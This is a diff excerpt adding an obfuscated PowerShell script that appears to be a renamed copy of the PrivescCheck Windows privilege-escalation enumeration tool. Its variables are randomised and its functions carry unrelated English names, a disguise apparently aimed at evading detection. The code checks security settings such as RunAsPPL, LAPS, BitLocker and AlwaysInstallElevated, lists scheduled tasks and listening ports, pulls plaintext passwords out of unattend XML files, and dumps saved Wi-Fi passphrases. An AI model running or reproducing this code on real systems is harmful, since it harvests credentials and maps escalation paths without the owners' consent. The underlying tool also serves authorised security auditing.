+        } else {
+            $PGwQfWGS99 = $False
+            $SSwKgPSl99 = "Credential Guard is not configured"
+        }
+    } else {
+        $PGwQfWGS99 = $False
+        $SSwKgPSl99 = "Credential Guard is not supported on this OS"
+    }
+    $spRTgUiR99 = New-Object -TypeName PSObject
+    $spRTgUiR99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Credential Guard"
+    $spRTgUiR99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+    $spRTgUiR99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $SSwKgPSl99
+    $spRTgUiR99
+}
+function chaster {
+    
+    [CmdletBinding()]Param()
+    $QGgQyZuh99 = [System.Environment]::OSVersion.Version
+    if ($QGgQyZuh99.Major -eq 10 -or ( ($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -ge 3) )) {
+        $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
+        $XwsMixSg99 = Get-ItemProperty -Path "REgistry::$($XtIMwCTj99)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+        if (-not $EXIfkazW99) {
+            if (-not ($Null -eq $XwsMixSg99.RunAsPPL)) {
+                if ($XwsMixSg99.RunAsPPL -eq 1) {
+                    $PGwQfWGS99 = $True 
+                    $SSwKgPSl99 = "RunAsPPL is enabled"
+                } else {
+                    $PGwQfWGS99 = $False 
+                    $SSwKgPSl99 = "RunAsPPL is disabled"
+                } 
+            } else {
+                $PGwQfWGS99 = $False 
+                $SSwKgPSl99 = "RunAsPPL is not configured"
+            }
+        }
+    } else {
+        $PGwQfWGS99 = $False 
+        $SSwKgPSl99 = "RunAsPPL is not supported on this OS"
+    }
+    $qpmjKFDs99 = New-Object -TypeName PSObject
+    $qpmjKFDs99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "RunAsPPL"
+    $qpmjKFDs99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+    $qpmjKFDs99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $SSwKgPSl99
+    $qpmjKFDs99
+}
+function amiability {
+    [CmdletBinding()]Param(
+        [Parameter(Mandatory=$True)]
+        [string]$Path
+    )
+    function fluctuates {
+        [CmdletBinding()]Param(
+            [object]$FhwnFUOQ99
+        )
+        if ($FhwnFUOQ99.GetType().Name -eq "string") {
+            $FhwnFUOQ99
+        } else {
+            if ($FhwnFUOQ99) {
+                if ($FhwnFUOQ99.PlainText -eq "false") {
+                    [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($FhwnFUOQ99.Value))
+                } else {
+                    $FhwnFUOQ99.Value
+                }
+            }
+        }
+    }
+    [xml] $Xml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
+    if (-not $icsLKeBl99) {
+        $Xml.GetElementsByTagName("Credentials") | ForEach-Object {
+            $YpZabYIp99 = fluctuates -FhwnFUOQ99 $_.Password
+            if ($YpZabYIp99 -and ( -not ($YpZabYIp99 -eq "*SENSITIVE*DATA*DELETED*"))) {
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $YpZabYIp99
+                $Item
+            }
+        }
+    
+        $Xml.GetElementsByTagName("LocalAccount") | ForEach-Object {
+            $YpZabYIp99 = fluctuates -FhwnFUOQ99 $_.Password
+    
+            if ($YpZabYIp99 -and ( -not ($YpZabYIp99 -eq "*SENSITIVE*DATA*DELETED*"))) {
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $YpZabYIp99
+                $Item
+            }
+        }
+    
+        $Xml.GetElementsByTagName("AutoLogon") | ForEach-Object {
+            $YpZabYIp99 = fluctuates -FhwnFUOQ99 $_.Password
+            if ($YpZabYIp99 -and ( -not ($YpZabYIp99 -eq "*SENSITIVE*DATA*DELETED*"))) {
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AutoLogon"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $YpZabYIp99
+                $Item
+            }
+        }
+        $Xml.GetElementsByTagName("AdministratorPassword") | ForEach-Object {
+            $YpZabYIp99 = fluctuates -FhwnFUOQ99 $_
+            if ($YpZabYIp99 -and ( -not ($YpZabYIp99 -eq "*SENSITIVE*DATA*DELETED*"))) {
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AdministratorPassword"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $YpZabYIp99
+                $Item
+            }
+        }
+    }
+}
+function thy {
+    [CmdletBinding()] param()
+    function embezzles {
+        param(
+            [string]$Path
+        )
+        $Info = New-Object -TypeName PSObject
+        [xml] $xBiADGRh99 = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
+        if (-not $icsLKeBl99) {
+            $xBiADGRh99.GetElementsByTagName("assembly") | ForEach-Object {
+                $Info | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($_.displayName)"
+                $Info | Add-Member -MemberType "NoteProperty" -Name "SupportInformation" -Value "$($_.supportInformation)"
+            }
+            $xBiADGRh99.GetElementsByTagName("package") | ForEach-Object {
+                $Info | Add-Member -MemberType "NoteProperty" -Name "Identifier" -Value "$($_.identifier)"
+                $Info | Add-Member -MemberType "NoteProperty" -Name "ReleaseType" -Value "$($_.releaseType)"
+            }
+            $Info
+        }
+    }
+    if ($blaJaEXm99.Count -eq 0) {
+        $CvXDjBFS99 = New-Object -TypeName System.Collections.ArrayList
+        $YVOEbslT99 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem
+        if (-not $hmUhMoHB99) {
+            $YVOEbslT99 | ForEach-Object {
+        
+                if (($_.Name | Split-Path -Leaf) -Like "Package_*_for_KB*") {
+            
+                    $EXdGHsdn99 = $_ | Get-ItemProperty
+        
+                    $MbdIUlYO99 = $EXdGHsdn99.InstallName.Split('~')[0].Split('_') | Where-Object { $_ -Like "KB*" }
+                    if ($MbdIUlYO99) {
+        
+                        if (-not ($CvXDjBFS99 -contains $MbdIUlYO99)) {
+        
+                            [void]$CvXDjBFS99.Add($MbdIUlYO99)
+        
+                            $daJCIbfJ99 = circumcising -Sid $EXdGHsdn99.InstallUser
+                            
+                            $VkTcSMHh99 = $EXdGHsdn99.InstallTimeHigh
+                            $EXaUwMca99 = $EXdGHsdn99.InstallTimeLow
+                            $VzdGqlQL99 = $VkTcSMHh99 * [Math]::Pow(2, 32) + $EXaUwMca99
+                            $KRXAOAuX99 = [DateTime]::FromFileTime($VzdGqlQL99)
+        
+                            $QxehJDZB99 = Join-Path -Path $env:windir -ChildPath "servicing\Packages"
+                            $qVGCRWJa99 = Join-Path -Path $QxehJDZB99 -ChildPath $EXdGHsdn99.InstallName
+                            $uTYLwiWg99 = embezzles -Path $qVGCRWJa99
+        
+                            $Entry = New-Object -TypeName PSObject 
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "HotFixID" -Value "$MbdIUlYO99"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($uTYLwiWg99.ReleaseType)"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "InstalledBy" -Value "$daJCIbfJ99"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "InstalledOn" -Value $KRXAOAuX99
+                            [void]$blaJaEXm99.Add($Entry)
+                        }
+                    }
+                }
+            }
+        } else {
+            Get-HotFix | Select-Object HotFixID,Description,InstalledBy,InstalledOn | ForEach-Object {
+                [void]$blaJaEXm99.Add($_)
+            }
+        }
+    }
+    $blaJaEXm99 | ForEach-Object {
+        $_
+    }
+}
+function impolitic {
+    [CmdletBinding()] param ()
+    $MVVnicrZ99 = Join-Path -Path $env:windir -ChildPath "CCMCache"
+    Get-Item -Path $MVVnicrZ99 -ErrorAction SilentlyContinue | Select-Object -Property FullName,Attributes,Exists
+}
+function dissecting {
+    function ramified {
+        param (
+            [object]$ghiDMOMF99,
+            [string]$ttUeaxpP99
+        )
+        ($vKlRlVPc99 = $ghiDMOMF99.GetFolder($ttUeaxpP99)).GetTasks(0)
+        $vKlRlVPc99.GetFolders(0) | ForEach-Object {
+            ramified -ghiDMOMF99 $ghiDMOMF99 -ttUeaxpP99 $(Join-Path -Path $ttUeaxpP99 -ChildPath $_.Name )
+        }
+    }
+    try {
+        if ($OLwZdaCt99.Count -eq 0) {
+            $NAsVKuiL99 = New-Object -ComObject("Schedule.Service")
+            $NAsVKuiL99.Connect()
+    
+            ramified -ghiDMOMF99 $NAsVKuiL99 -ttUeaxpP99 "\" | ForEach-Object {
+    
+                if ($_.Enabled) {
+    
+                    $zDONvYMT99 = $_.Name
+                    $ttUeaxpP99 = $_.Path
+                    $VrnuIZhv99 = Join-Path -Path $(Join-Path -Path $env:windir -ChildPath "System32\Tasks") -ChildPath $ttUeaxpP99
+    
+                    [xml]$IDecsbhd99 = $_.Xml
+                    $kvgQzwlC99 = $IDecsbhd99.GetElementsByTagName("Exec")
+                    $diNYHbbO99 = "$($kvgQzwlC99.Command) $($kvgQzwlC99.Arguments)"
+                    $hcSLNjqr99 = $IDecsbhd99.GetElementsByTagName("Principal")
+                    
+                    $GrsWhftS99 = $False
+    
+                    if ($hcSLNjqr99.UserId) {
+                        $nOafTmuK99 = circumcising -Sid $hcSLNjqr99.UserId
+                        
+                        if ($(nursing).SID -eq $hcSLNjqr99.UserId) {
+                            $GrsWhftS99 = $True
+                        }
+                    } elseif ($hcSLNjqr99.GroupId) {
+                        $nOafTmuK99 = circumcising -Sid $hcSLNjqr99.GroupId
+                    }
+    
+                    if ($kvgQzwlC99.Command.Length -gt 0) {
+    
+                        $XbClAjbO99 = New-Object -TypeName PSObject 
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $zDONvYMT99
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $ttUeaxpP99
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $VrnuIZhv99
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $nOafTmuK99
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $diNYHbbO99
+                        $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "CurrentUserIsOwner" -Value $GrsWhftS99
+                        [void] $OLwZdaCt99.Add($XbClAjbO99)
+    
+                    } else {
+                        Write-Verbose "Task '$($_.Name)' has an empty cmd line"
+                    }
+                } else {
+                    Write-Verbose "Task '$($_.Name)' is disabled"
+                }
+            }
+        }
+        $OLwZdaCt99 | ForEach-Object { 
+            $_
+        }
+    } catch {
+        Write-Verbose $_
+    }
+}
+function Yugoslavian {
+    
+    [CmdletBinding()]Param()
+    $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    $Item = Get-ItemProperty -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+    if (-not $EXIfkazW99) {
+        $VdIImBMH99 = New-Object -TypeName PSObject
+        $VdIImBMH99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $XtIMwCTj99
+        $VdIImBMH99 | Add-Member -MemberType "NoteProperty" -Name "EnableLUA" -Value $Item.EnableLUA
+        $VdIImBMH99 | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.EnableLUA -eq 1)
+        $VdIImBMH99
+    } else {
+        Write-Verbose -Message "Error while querying '$XtIMwCTj99'"
+    }
+}
+function incursions {
+    
+    [CmdletBinding()]Param()
+    
+    $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd"
+    $Item = Get-ItemProperty -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    if (-not $EXIfkazW99) {
+        $hhZDIrDj99 = New-Object -TypeName PSObject 
+        $hhZDIrDj99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $XtIMwCTj99
+        $hhZDIrDj99 | Add-Member -MemberType "NoteProperty" -Name "AdmPwdEnabled" -Value $Item.AdmPwdEnabled
+        $hhZDIrDj99 | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.AdmPwdEnabled -eq 1)
+        $hhZDIrDj99
+    }
+}
+function innocuous {
+    
+    [CmdletBinding()]Param()
+    $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+    $Item = Get-ItemProperty -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    if (-not $EXIfkazW99) {
+        $bieNUnCE99 = New-Object -TypeName PSObject 
+        $bieNUnCE99 | Add-Member -MemberType "NoteProperty" -Name "EnableTranscripting" -Value $Item.EnableTranscripting
+        $bieNUnCE99 | Add-Member -MemberType "NoteProperty" -Name "EnableInvocationHeader" -Value $Item.EnableInvocationHeader
+        $bieNUnCE99 | Add-Member -MemberType "NoteProperty" -Name "OutputDirectory" -Value $Item.OutputDirectory
+        $bieNUnCE99
+    } 
+}
+function Poland {
+    [CmdletBinding()]Param()
+    $dajKMYWC99 = pita
+    if ($dajKMYWC99.Name -Like "WinNT") {
+        $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BitLockerStatus"
+        $Item = Get-ItemProperty -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+        if (-not $EXIfkazW99) {
+            if (-not ($Item.BootStatus -eq 1)) {
+                $tNHlYKNP99 = New-Object -TypeName PSObject 
+                $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $XtIMwCTj99
+                $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value $Item.BootStatus
+                $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't enabled."
+                $tNHlYKNP99
+            }
+        } else {
+            $tNHlYKNP99 = New-Object -TypeName PSObject 
+            $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $XtIMwCTj99
+            $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value ""
+            $tNHlYKNP99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't configured."
+            $tNHlYKNP99
+        }
+    }
+}
+function upstaging {
+    
+    [CmdletBinding()]Param()
+    $XwsMixSg99 = New-Object -TypeName System.Collections.ArrayList
+    $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"
+    if (Test-Path -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue) {
+        $rpgBmEqO99 = Get-ItemProperty -Path "Registry::$XtIMwCTj99" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+        if ($rpgBmEqO99.AlwaysInstallElevated -and ($rpgBmEqO99.AlwaysInstallElevated -ne 0)){
+            $Item = New-Object -TypeName PSObject 
+            $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $XtIMwCTj99
+            $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $rpgBmEqO99.AlwaysInstallElevated 
+            $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
+            [void]$XwsMixSg99.Add($Item)
+        }
+        $XtIMwCTj99 = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"
+        if (Test-Path -Path "Registry::$XtIMwCTj99" -ErrorAction SilentlyContinue) {
+            $HLThNEGf99 = (Get-ItemProperty -Path "Registry::$XtIMwCTj99" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
+            if ($HLThNEGf99.AlwaysInstallElevated -and ($HLThNEGf99.AlwaysInstallElevated -ne 0)){
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $XtIMwCTj99
+                $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $rpgBmEqO99.AlwaysInstallElevated 
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
+                [void]$XwsMixSg99.Add($Item)
+                $XwsMixSg99
+            }
+        } 
+    }
+}
+function depend {
+    
+    [CmdletBinding()]Param()
+    chaster
+    shade
+    gals
+    foreshadowed
+}
+function Orlons {
+    $exuGOCqL99 = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate"
+    $fYRxTVEs99 = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU"
+    $hDEhvKXa99 = Get-ItemProperty -Path "Registry::$($exuGOCqL99)" -Name WUServer -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItemProperty
+    if (-not $ybxktDLH99) {
+        $WbArqJXV99 = $hDEhvKXa99.WUServer
+        $SCWKvAyt99 = Get-ItemProperty -Path "Registry::$($fYRxTVEs99)" -Name UseWUServer -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItemProperty
+        if (-not $ybxktDLH99) {
+            $rSIAFPAL99 = $SCWKvAyt99.UseWUServer
+            
+            if ($WbArqJXV99 -Like "http://*" -and $rSIAFPAL99 -eq 1) {
+                
+                $XwsMixSg99 = New-Object -TypeName PSObject
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "WUServer" -Value $WbArqJXV99
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "UseWUServer" -Value $rSIAFPAL99
+                $XwsMixSg99
+            } 
+        }
+    }
+}
+function misgovern {
+    [CmdletBinding()] param ()
+    $jYtOtegW99 = impolitic
+    if ($jYtOtegW99) {
+        $XwsMixSg99 = $jYtOtegW99
+        try {
+            $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "Acl" -Value $($jYtOtegW99 | Get-Acl -ErrorAction SilentlyContinue | Select-Object -ExpandProperty AccessToString) 
+        } catch {
+        }
+        $XwsMixSg99
+    }
+}
+function Kremlinologist {
+    [CmdletBinding()] param ()
+    $SRcmBBbs99 = impolitic
+    if ($SRcmBBbs99) {
+        Get-ChildItem -Path $SRcmBBbs99.FullName -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem | Out-Null
+        if (-not $hmUhMoHB99) {
+            $SRcmBBbs99
+        }
+    }
+}
+function screwdriver {
+    [CmdletBinding()]Param(
+        [Parameter(Mandatory=$True)]
+        [int[]]
+        $Ports
+    )
+    function echoes {
+        [CmdletBinding()]Param(
+            [int[]]$Ports,
+            [int]$rCopBkEG99,
+            [int]$bTRlJLjc99,
+            [int]$Span
+        )
+        $Stats = @() 
+        For ($i = $rCopBkEG99; $i -lt $bTRlJLjc99; $i += $Span) {
+            $DsPRsXLn99 = 0
+            ForEach ($Port in $Ports) {
+                if (($Port -ge $i) -and ($Port -lt ($i + $Span))) {
+                    $DsPRsXLn99 += 1
+                }
+            }
+            $QzEEkxgr99 = New-Object -TypeName PSObject 
+            $QzEEkxgr99 | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $i
+            $QzEEkxgr99 | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value ($i + $Span)
+            $QzEEkxgr99 | Add-Member -MemberType "NoteProperty" -Name "PortsInRange" -Value $DsPRsXLn99
+            $Stats += $QzEEkxgr99 
+        }
+        $Stats
+    }
+    $Stats = echoes -Ports $Ports -rCopBkEG99 49152 -bTRlJLjc99 65536 -Span 32
+    $pLHDYjCY99 = $Null
+    ForEach ($Stat in $Stats) {
+        if ($Stat.PortsInRange -gt $pLHDYjCY99.PortsInRange) {
+            $pLHDYjCY99 = $Stat
+        }
+    } 
+    For ($i = 0; $i -lt 8; $i++) {
+        $Span = ($pLHDYjCY99.MaxPort - $pLHDYjCY99.MinPort) / 2
+        $MYFvflUx99 = echoes -Ports $Ports -rCopBkEG99 $pLHDYjCY99.MinPort -bTRlJLjc99 $pLHDYjCY99.MaxPort -Span $Span
+        if ($MYFvflUx99) {
+            if ($MYFvflUx99[0].PortsInRange -eq 0) {
+                $pLHDYjCY99 = $MYFvflUx99[1]
+            } elseif ($MYFvflUx99[1].PortsInRange -eq 0) {
+                $pLHDYjCY99 = $MYFvflUx99[0]
+            } else {
+                break 
+            }
+        }
+    }
+    $FvZXuyBn99 = New-Object -TypeName PSObject 
+    $FvZXuyBn99 | Add-Member -MemberType "NoteProperty" -Name "MinPort" -Value $pLHDYjCY99.MinPort
+    $FvZXuyBn99 | Add-Member -MemberType "NoteProperty" -Name "MaxPort" -Value $pLHDYjCY99.MaxPort
+    $FvZXuyBn99
+}
+function bruising {
+    [CmdletBinding()]Param(
+        [switch]$ovMLtgnb99
+    )
+    $ADrgqAqH99 = @(135, 139, 445)
+    $oHyyloMg99 = published
+    $oHyyloMg99 += published -IPv6
+    if ($ovMLtgnb99) {
+        $pErIRiMZ99 = @()
+        $LBVOrLkT99 = @()
+        $oHyyloMg99 | ForEach-Object { $LBVOrLkT99 += $_.LocalPort }
+        $LBVOrLkT99 = $LBVOrLkT99 | Sort-Object -Unique
+        
+        $FvZXuyBn99 = screwdriver -Ports $LBVOrLkT99
+        Write-Verbose "Excluding port range: $($FvZXuyBn99.MinPort)-$($FvZXuyBn99.MaxPort)"
+    
+        $oHyyloMg99 | ForEach-Object {
+            if (-not ($ADrgqAqH99 -contains $_.LocalPort)) {
+                if ($FvZXuyBn99) {
+                    if (($_.LocalPort -lt $FvZXuyBn99.MinPort) -or ($_.LocalPort -ge $FvZXuyBn99.MaxPort)) {
+                        
+                        $pErIRiMZ99 += $_
+                    }
+                }
+            }
+        }
+        $oHyyloMg99 = $pErIRiMZ99
+    } 
+    $oHyyloMg99 | ForEach-Object {
+        $eAqNybaP99 = New-Object -TypeName PSObject
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
+        $eAqNybaP99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
+        $eAqNybaP99
+    }
+}
+function obliterate {
+    
+    [CmdletBinding()]Param(
+        [switch]$ovMLtgnb99
+    )
+    $ADrgqAqH99 = @(53, 67, 123, 137, 138, 139, 500, 1701, 2535, 4500, 445, 1900, 5050, 5353, 5355)
+    
+    $oHyyloMg99 = published -UDP 
+    $oHyyloMg99 += published -UDP -IPv6
+    if ($ovMLtgnb99) {
+        $pErIRiMZ99 = @()
+        $oHyyloMg99 | ForEach-Object {
+            if (-not ($ADrgqAqH99 -contains $_.LocalPort)) {
+                $pErIRiMZ99 += $_
+            }
+        }
+        $oHyyloMg99 = $pErIRiMZ99
+    }
+    $oHyyloMg99 | ForEach-Object {
+        if (-not ($_.Name -eq "dns")) {
+            $aPTvEEjZ99 = New-Object -TypeName PSObject 
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
+            $aPTvEEjZ99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
+            $aPTvEEjZ99
+        }
+    }
+}
+function colonizes {
+    [CmdletBinding()] param()
+    function placebos {
+        [CmdletBinding()] param(
+            [string]$HZEfeGuK99
+        )
+        $Xml = [xml] $HZEfeGuK99
+        $Name = $Xml.WLANProfile.name
+        $Ssid = $Xml.WLANProfile.SSIDConfig.SSID.name 
+        $KeZFAHjh99 = $Xml.WLANProfile.MSM.security.authEncryption.authentication
+        $DXcQVFoB99 = $Xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+        $oWMFxOFX99 = New-Object -TypeName PSObject
+        $oWMFxOFX99 | Add-Member -MemberType "NoteProperty" -Name "Profile" -Value $Name
+        $oWMFxOFX99 | Add-Member -MemberType "NoteProperty" -Name "SSID" -Value $Ssid
+        $oWMFxOFX99 | Add-Member -MemberType "NoteProperty" -Name "Authentication" -Value $KeZFAHjh99
+        $oWMFxOFX99 | Add-Member -MemberType "NoteProperty" -Name "PassPhrase" -Value $DXcQVFoB99
+        $oWMFxOFX99
+    }
+    $rltZTwCq99 = 0
+    try {
+        [IntPtr]$qPEdrjNB99 = [IntPtr]::Zero
+        $NjXgVehI99 = 0
+        $XwsMixSg99 = [PrivescCheck.Win32]::WlanOpenHandle(2, [IntPtr]::Zero, [ref]$NjXgVehI99, [ref]$qPEdrjNB99)
+        if ($XwsMixSg99 -eq $rltZTwCq99) {
+    
+            Write-Verbose "WlanOpenHandle() OK - Handle: $($qPEdrjNB99)"
+    
+            [IntPtr]$tkVGjcWq99 = [IntPtr]::Zero
+            $XwsMixSg99 = [PrivescCheck.Win32]::WlanEnumInterfaces($qPEdrjNB99, [IntPtr]::Zero, [ref]$tkVGjcWq99)
+            if ($XwsMixSg99 -eq $rltZTwCq99) {
+    
+                Write-Verbose "WlanEnumInterfaces() OK - Interface list pointer: 0x$($tkVGjcWq99.ToString('X8'))"
+    
+                $Vxduzebe99 = [Runtime.InteropServices.Marshal]::ReadInt32($tkVGjcWq99)
+                Write-Verbose "Number of Wlan interfaces: $($Vxduzebe99)"
+    
+                $FFwUnnCu99 = [IntPtr] ($tkVGjcWq99.ToInt64() + 8) # dwNumberOfItems + dwIndex
+    
+                for ($i = 0; $i -lt $Vxduzebe99; $i++) {
+    
+                    $hJDgYRWc99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FFwUnnCu99, [type] [PrivescCheck.Win32+WLAN_INTERFACE_INFO])
+    
+                    Write-Verbose "Wlan interface: $($hJDgYRWc99.strInterfaceDescription)"
+    
+                    [IntPtr]$XhrTAzge99 = [IntPtr]::Zero
+                    $XwsMixSg99 = [PrivescCheck.Win32]::WlanGetProfileList($qPEdrjNB99, $hJDgYRWc99.InterfaceGuid, [IntPtr]::Zero, [ref]$XhrTAzge99)
+                    if ($XwsMixSg99 -eq $rltZTwCq99) {
+    
+                        Write-Verbose "WlanGetProfileList() OK - Profile list pointer: 0x$($XhrTAzge99.ToString('X8'))"
+    
+                        $VMDQLsEG99 = [Runtime.InteropServices.Marshal]::ReadInt32($XhrTAzge99)
+                        Write-Verbose "Number of profiles: $($VMDQLsEG99)"
+    
+                        $lzwAnLHO99 = [IntPtr] ($XhrTAzge99.ToInt64() + 8) # dwNumberOfItems + dwIndex
+    
+                        for ($j = 0; $j -lt $VMDQLsEG99; $j++) {
+    
+                            $xRtwAGRv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($lzwAnLHO99, [type] [PrivescCheck.Win32+WLAN_PROFILE_INFO])
+    
+                            Write-Verbose "Wlan profile: $($xRtwAGRv99.strProfileName)"
+    
+                            [string]$HZEfeGuK99 = ""
+                            [UInt32]$tXRhUTgO99 = 4 # WLAN_PROFILE_GET_PLAINTEXT_KEY
+                            [UInt32]$zpMspsUM99 = 0
+                            $XwsMixSg99 = [PrivescCheck.Win32]::WlanGetProfile($qPEdrjNB99, $hJDgYRWc99.InterfaceGuid, $xRtwAGRv99.strProfileName, [IntPtr]::Zero, [ref]$HZEfeGuK99, [ref]$tXRhUTgO99, [ref]$zpMspsUM99)
+                            if ($XwsMixSg99 -eq $rltZTwCq99) {
+    
+                                Write-Verbose "WlanGetProfile() OK"
+    
+                                $Item = placebos -HZEfeGuK99 $HZEfeGuK99
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "Interface" -Value $hJDgYRWc99.strInterfaceDescription
+                                $Item
+    
+                            } else {
+                                Write-Verbose "WlanGetProfile() failed (Err: $($XwsMixSg99))"
+                            }
+    
+                            $lzwAnLHO99 = [IntPtr] ($lzwAnLHO99.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($xRtwAGRv99))
+                        }
+    
+                        [PrivescCheck.Win32]::WlanFreeMemory($XhrTAzge99)
+    
+                    } else {
+                        Write-Verbose "WlanGetProfileList() failed (Err: $($XwsMixSg99))"
+                    }
+    
